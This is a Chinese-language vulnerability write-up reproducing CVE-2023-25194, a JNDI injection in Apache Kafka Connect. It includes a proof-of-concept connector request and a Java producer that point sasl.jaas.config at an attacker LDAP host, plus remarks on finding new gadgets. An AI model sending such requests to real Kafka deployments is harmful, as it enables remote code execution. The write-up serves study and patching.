# 简介
Apache Kafka是一种分布式的，基于发布/订阅的消息系统。

* 生产者和消费者（producer和consumer）：消息的发送者叫 Producer，消息的使用者和接受者是 Consumer，生产者将数据保存到 Kafka 集群中，消费者从中获取消息进行业务的处理。
* broker：Kafka 集群中有很多个Server，其中每一个Server都可以存储消息，将每一个Server 称为一个kafka 实例，也叫做 broker。
* 主题（topic）：一个 topic 里保存的是同一类消息，相当于对消息的分类，每个 producer 将消息发送到 kafka 中，都需要指明要存的 topic 是哪个，也就是指明这个消息属于哪一类。
* 分区（partition）：kafka基于文件进行存储,每个 topic 都可以分成多个 partition，每个 partition 在存储层面是 append log 文件。

Apache Kafka 的一个关键依赖是 Apache Zookeeper，它是一个分布式配置和同步服务。Zookeeper 是 Kafka 代理和消费者之间的协调接口。Kafka 服务器通过 Zookeeper 集群共享信息。

CVE-2023-25194是发生在 Apache Kafka Connector中的JNDI注入漏洞。通过 Kafka Connect REST API 配置连接器时，经过身份验证的操作员可以将连接器的任何Kafka客户端的“sasl.jaas.config”属性设置为“com.sun.security.auth.module.JndiLoginModule”，LoginModule允许访问用户指定的JNDI 服务提供商，因此导致JNDI注入。

影响版本: Kafka<3.4.0,因为: "Since Apache Kafka 3.4.0, we have added a system property ("org.apache.kafka.disallowed.login.modules") to disable the problematic login modules usage in SASL JAAS configuration. Also by default "com.sun.security.auth.module.JndiLoginModule" is disabled from Apache Kafka 3.4.0."

# 复现

POC参考https://github.com/ohnonoyesyes/CVE-2023-25194：

```java
POST /connectors HTTP/1.1
Host: xxxx:8083
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Content-Type: application/json
Connection: close
Content-Length: 1109

{"name": "test", 
   "config":
    {
        "connector.class":"io.debezium.connector.mysql.MySqlConnector",
    	"database.hostname": "xxxxx",
    	"database.port": "3306",
    	"database.user": "root",
    	"database.password": "xxxxxx",
    	"database.dbname": "xxxx",
    	"database.sslmode": "SSL_MODE",
        "database.server.id": "1234",
    	"database.server.name": "localhost",
        "table.include.list": "MYSQL_TABLES",
    	"tasks.max":"1",
        "topic.prefix": "aaa22",
        "debezium.source.database.history": "io.debezium.relational.history.MemoryDatabaseHistory",
        "schema.history.internal.kafka.topic": "aaa22",
        "schema.history.internal.kafka.bootstrap.servers": "kafka:9202",
    	"database.history.producer.security.protocol": "SASL_SSL",
    	"database.history.producer.sasl.mechanism": "PLAIN",
    	"database.history.producer.sasl.jaas.config": "com.sun.security.auth.module.JndiLoginModule required user.provider.url=\"ldap://aaa\" useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" group.provider.url=\"xxx\";"
    }
}
```

这里直接通过将producer中配置项设置为`com.sun.security.auth.module.JndiLoginModule` 方式进行验证:

* 下载kafka
* 启动server和zookeeper
```shell
bin\windows\zookeeper-server-start.bat config\zookeeper.properties
bin\windows\kafka-server-start.bat config\server.properties
```
* 设置好rmi server

使用下面的代码将kafka的认证方式设置为com.sun.security.auth.module.JndiLoginModule,从而触发JndiLoginModule中的InitialContext.lookup(userProvider):
```java
public class ProducerDemo {

    public static void main(String[] args) {
        System.out.println("I am a Kafka Producer");

        // producer properties
        String bootstrapServers = "127.0.0.1:9092";

        // create Producer properties
        Map configs = new HashMap();
        configs.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);
        configs.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName());
        configs.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName());
        // https://kafka.apache.org/documentation/#producerconfigs_sasl.jaas.config
        configs.put("SSL","true");
        configs.put("sasl.mechanism","PLAIN");
        configs.put("security.protocol","SASL_SSL");
        configs.put("sasl.jaas.config","com.sun.security.auth.module.JndiLoginModule required user.provider.url=\"ldap://attacker_server\" useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" group.provider.url=\"xxx\";");

        //Create the Kafka producer
        KafkaProducer<String, String> producer = new KafkaProducer<>(configs);
        // create a producer record
        ProducerRecord<String, String> producerRecord = new ProducerRecord<>("first_topic", "hello world");
        // send data - asynchronous
        producer.send(producerRecord);
        // flush data - synchronous
        producer.flush();
        // flush and close producer
        producer.close();
    }
}
```
![](images/1.png)

# 漏洞原理

好像也没啥需要进一步分析的,只要攻击者可以控制kafka-clients连接时的属性，将属性sasl.jaas.config值设置为com.sun.security.auth.module.JndiLoginModule，使其能够发起JNDI连接，就会导致JNDI注入漏洞。

# 关联的其他CVE
Apache Druid最新的JNDI注入漏洞也是一样的原理。

# 其他
之前一直使用BeanFactory挺好用的，但是最近复现的时候发现在tomcat>8.5.78的版本上报错如下:
```shell
The forceString option has been removed as a security hardening measure. Instead, if the setter method doesn't use String, a primitive or a primitive wrapper, the factory will look for a method with the same name as the setter that accepts a String and use that if found.
```
![](images/2.png)
看tomcat的变更记录也有提到: https://tomcat.apache.org/tomcat-8.5-doc/changelog.html
![](images/3.png)

需要找其他的gadgets来替代了。